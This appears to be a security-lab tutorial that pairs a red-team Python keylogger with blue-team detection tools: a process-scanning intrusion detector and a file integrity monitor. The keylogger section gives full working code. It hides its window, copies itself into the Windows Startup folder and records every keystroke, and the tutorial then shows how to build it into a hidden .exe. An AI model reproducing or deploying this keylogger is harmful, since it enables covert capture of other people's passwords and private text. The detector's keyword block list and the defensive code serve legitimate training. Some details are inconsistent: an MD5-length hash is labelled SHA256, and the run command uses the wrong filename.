## Secplus
#### Step 1: Make a new folder (in downloads folder) and name it SecLab

RED TEAM — Keylogger
```bash
mkdir Keylogger
cd Keylogger
```
#### Create keylogger.py:

```bash
import os
import sys
import shutil
import ctypes
import logging
from datetime import datetime
from pynput import keyboard

# === Hide console window (when .exe only) ===
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass  # avoid crash on non-Windows or during testing

# === Auto-run on startup (only works when compiled to .exe) ===
def autorun():
    try:
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        exe_name = "keylogger.exe"
        dest_path = os.path.join(startup, exe_name)

        if not os.path.exists(dest_path):
            shutil.copyfile(sys.executable, dest_path)
    except:
        pass  # silently skip if not .exe or permission denied

autorun()

# === Setup logging ===
os.makedirs("logs", exist_ok=True)
log_file = f"logs/keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# === Define keypress behavior ===
def on_press(key):
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Special: {key}")

# === Start listening in background ===
listener = keyboard.Listener(on_press=on_press)
listener.start()

# === Keep script running ===
print(f"[Keylogger running...] Logs will be saved to: {log_file}")
input("Press ENTER here to stop logging...\n")

# === Stop listener gracefully ===
listener.stop()
```
##### In terminal:

```bash
pip install pynput
python keylogger.py
```
 You’ll see no terminal output — but keypresses will be saved in the logs/ folder.

## BLUE TEAM — HIDS
#### Create HIDS folder

```bash
cd ..
mkdir HIDS
cd HIDS
```
### Create hids.py and paste this code:

```bash
import psutil
import hashlib
import os
import time
import ctypes
import shutil

# === CONFIGURATION ===
MALICIOUS_KEYWORDS = ["keylogger"]  # Add more keywords as needed
KNOWN_BAD_HASHES = ["e99a18c428cb38d5f260853678922e03"]  # SHA256 hashes of known malware
QUARANTINE_FOLDER = "quarantine"
LOG_FILE = "hids_log.txt"

# === SETUP ===
if not os.path.exists(QUARANTINE_FOLDER):
    os.makedirs(QUARANTINE_FOLDER)

# === UTILITY FUNCTIONS ===
def hash_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception:
        return None  # Silent fail for inaccessible files

def log_alert(message):
    # Alert in terminal, log file, and popup
    print(f"\033[91m{message}\033[0m")  # Red text
    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(message + "\n")
    except:
        pass  # Prevent crash if log file fails

    try:
        ctypes.windll.user32.MessageBoxW(0, message, "Mini HIDS Alert", 1)
    except:
        pass  # Prevent crash if GUI alert fails

# === MAIN MONITOR FUNCTION ===
def scan_processes():
    for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
        try:
            name = proc.info.get('name', '')
            cmdline_raw = proc.info.get('cmdline')
            cmd = ' '.join(cmdline_raw) if isinstance(cmdline_raw, list) else ''
            exe_path = proc.info.get('exe', '')

            if not name:
                continue

            # Skip if this is the HIDS script itself
            if "hids" in name.lower():
                continue

            # === 1. Keyword Detection ===
            if any(keyword in cmd.lower() for keyword in MALICIOUS_KEYWORDS):
                alert_msg = (
                    f"[ALERT] Suspicious keyword found!\n"
                    f"Process: {name}\n"
                    f"PID: {proc.pid}\n"
                    f"CMD: {cmd}\n"
                    f"File: {exe_path}"
                )
                log_alert(alert_msg)

                # Quarantine logic
                if exe_path and os.path.exists(exe_path):
                    if "python" not in os.path.basename(exe_path).lower():
                        try:
                            proc.kill()
                            quarantine_path = os.path.join(QUARANTINE_FOLDER, os.path.basename(exe_path))
                            shutil.move(exe_path, quarantine_path)
                            log_alert(f"[X] Quarantined: {exe_path}")
                        except:
                            pass  # Catch any file access errors

            # === 2. Hash Detection ===
            if exe_path and os.path.exists(exe_path):
                file_hash = hash_file(exe_path)
                if file_hash in KNOWN_BAD_HASHES:
                    alert_msg = (
                        f"[ALERT] Malicious hash match!\n"
                        f"Process: {name}\n"
                        f"PID: {proc.pid}\n"
                        f"Hash: {file_hash}\n"
                        f"File: {exe_path}"
                    )
                    log_alert(alert_msg)

                    try:
                        proc.kill()
                        quarantine_path = os.path.join(QUARANTINE_FOLDER, os.path.basename(exe_path))
                        shutil.move(exe_path, quarantine_path)
                        log_alert(f"[X] Quarantined by hash: {exe_path}")
                    except:
                        pass

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess, TypeError):
            continue  # Safe skip if process disappears or cmdline is bad

# === MAIN LOOP ===
if __name__ == "__main__":
    print("== Mini Host-Based IDS Started ==")
    while True:
        scan_processes()
        time.sleep(5)  # Scan every 5 seconds
```
### Install module
```bash
pip install psutil
```
### Run HIDS
```bash
python hids.py
```
This script will:
Scan all running processes.
Alert (popup + red text) if a suspicious command is found (e.g., includes keylogger).
Kill the process and move it to a quarantine/ folder.
You can test this by running keylogger.py in one terminal, and then hids.py in another.

### BLUE TEAM — File Integrity Monitoring (FIM)
```bash
cd ..
mkdir FIM
cd FIM
mkdir logs protected_files
```
#### Create fim_gui.py and paste your code.
```bash
import os
import hashlib
import time
import csv
from datetime import datetime
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog

# === Config ===
MONITOR_DIR = "protected_files"
HASH_DB = "logs/fim_hashes.txt"
ALERT_LOG = "logs/fim_alerts.txt"

os.makedirs("logs", exist_ok=True)
os.makedirs(MONITOR_DIR, exist_ok=True)

# === FIM Logic ===
def get_hash(path):
    try:
        with open(path, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except:
        return None

def load_hashes():
    if not os.path.exists(HASH_DB): return {}
    with open(HASH_DB) as f:
        return dict(line.strip().split(" || ") for line in f)

def save_hashes(hashes):
    with open(HASH_DB, 'w') as f:
        for path, h in hashes.items():
            f.write(f"{path} || {h}\n")

def log_alert(msg):
    timestamped = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}"
    with open(ALERT_LOG, 'a') as f:
        f.write(timestamped + "\n")
    log_box.insert(tk.END, timestamped + "\n")
    log_box.see(tk.END)

def clear_logs():
    open(ALERT_LOG, 'w').close()
    log_box.delete('1.0', tk.END)
    messagebox.showinfo("Logs Cleared", "All alert logs have been cleared.")

def export_logs():
    if not os.path.exists(ALERT_LOG):
        messagebox.showwarning("No Logs", "No alert logs to export.")
        return

    dest = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV files", "*.csv")])
    if dest:
        with open(ALERT_LOG, 'r') as f, open(dest, 'w', newline='') as csv_file:
            writer = csv.writer(csv_file)
            writer.writerow(["Timestamped Alert"])
            for line in f:
                writer.writerow([line.strip()])
        messagebox.showinfo("Exported", f"Logs exported to:\n{dest}")

def update_table(file_hashes):
    for row in tree.get_children():
        tree.delete(row)
    for filepath, hash_value in file_hashes.items():
        tree.insert("", "end", values=(filepath, hash_value))

# === New: Safe scanning loop using root.after() ===
def monitor_files():
    if not monitoring:
        return  # Stop if turned off

    try:
        previous_hashes = load_hashes()
        current_hashes = {}

        for rootdir, _, files in os.walk(MONITOR_DIR):
            for file in files:
                path = os.path.join(rootdir, file)
                h = get_hash(path)
                if h:
                    current_hashes[path] = h

        for path in previous_hashes:
            if path not in current_hashes:
                log_alert(f"Deleted: {path}")
            elif current_hashes[path] != previous_hashes[path]:
                log_alert(f"Modified: {path}")

        for path in current_hashes:
            if path not in previous_hashes:
                log_alert(f"New file added: {path}")

        prev_dirs = set(os.path.dirname(p) for p in previous_hashes)
        curr_dirs = set(os.path.dirname(p) for p in current_hashes)
        deleted_dirs = prev_dirs - curr_dirs
        for d in deleted_dirs:
            log_alert(f"Directory deleted: {d}")

        save_hashes(current_hashes)
        update_table(current_hashes)
        scan_time_label.config(text=f"Last Scan: {datetime.now().strftime('%H:%M:%S')}")
    except Exception as e:
        log_alert(f"[ERROR] {str(e)}")

    root.after(5000, monitor_files)  # Schedule next run

# === GUI Setup ===
def start_monitor():
    global monitoring
    if not monitoring:
        monitoring = True
        log_alert("=== Monitoring Started ===")
        monitor_files()

def stop_monitor():
    global monitoring
    monitoring = False
    log_alert("=== Monitoring Stopped ===")

root = tk.Tk()
root.title("File Integrity Monitor (FIM) Dashboard")
root.geometry("800x600")

# === Logs ===
log_frame = tk.LabelFrame(root, text="Real-Time Alerts", padx=5, pady=5)
log_frame.pack(fill="both", expand=True, padx=10, pady=5)

log_box = scrolledtext.ScrolledText(log_frame, height=10, wrap=tk.WORD)
log_box.pack(fill="both", expand=True)

# === Buttons and Scan Info ===
control_frame = tk.Frame(root)
control_frame.pack(pady=5)

tk.Button(control_frame, text="Start Monitoring", command=start_monitor, bg="green", fg="white").pack(side=tk.LEFT, padx=5)
tk.Button(control_frame, text="Stop Monitoring", command=stop_monitor, bg="red", fg="white").pack(side=tk.LEFT, padx=5)
tk.Button(control_frame, text="Clear Logs", command=clear_logs).pack(side=tk.LEFT, padx=5)
tk.Button(control_frame, text="Export Logs to CSV", command=export_logs).pack(side=tk.LEFT, padx=5)

scan_time_label = tk.Label(root, text="Last Scan: N/A")
scan_time_label.pack()

# === Table of Monitored Files ===
table_frame = tk.LabelFrame(root, text="Monitored Files & Hashes", padx=5, pady=5)
table_frame.pack(fill="both", expand=True, padx=10, pady=5)

columns = ("File Path", "SHA256 Hash")
tree = ttk.Treeview(table_frame, columns=columns, show="headings")
for col in columns:
    tree.heading(col, text=col)
    tree.column(col, anchor="w", stretch=True)
tree.pack(fill="both", expand=True)

# === Monitoring State ===
monitoring = False

root.mainloop()
```
#### Run:
```bash
python fim.py
```

### PART 1: Convert Python to .exe

Step-by-Step (for each script: keylogger, hids, fim)
## Install PyInstaller (only once)

```bash
pip install pyinstaller
```
Navigate to your script folder, e.g.:
```bash
cd Downloads/SecLab/Keylogger
```

### Build the .exe

```bash
pyinstaller --onefile --noconsole keylogger.py
```
##### --onefile: Combines all dependencies into one .exe
##### --noconsole: Hides the terminal window (for background behavior)
##### Your .exe will be inside the dist/ folder. Copy it anywhere.
##### Repeat this for hids.py and fim.py in their respective folders.

